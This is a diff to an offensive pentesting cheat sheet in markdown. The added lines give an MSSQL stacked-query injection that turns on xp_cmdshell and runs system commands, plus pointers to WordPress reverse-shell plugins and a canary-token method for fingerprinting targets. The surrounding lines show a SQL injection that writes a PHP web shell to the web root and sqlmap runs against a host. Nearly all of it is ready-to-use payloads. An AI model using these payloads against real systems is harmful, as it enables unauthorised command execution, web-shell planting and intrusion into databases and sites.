@@ -427,6 +427,20 @@ http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
 ```
 
+### EXEC shell in MSSQL
+
+```powershell
+
+# inject as a stacked query
+
+12345'; EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'  -- pFml
+
+```
+
+
 ### Find injectable parameters using SQLMAP
 
 ```bash
@@ -444,4 +458,18 @@ sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age
 
 ## hacking wordpress panel RCE
 
-follow https://www.exploit-db.com/exploits/36374
+* create own reverse shell plugin https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
+
+* use some pre-made plugin https://www.exploit-db.com/exploits/36374
+
+## Fingerprinting target
+
+
+### Canary Token
+
+* get victim system info
+* generate tracking token 
+`https://www.canarytokens.org/generate`
+* create `web bug/ URL token`
+* send token to target
+* when triggered check web hook logs or mail
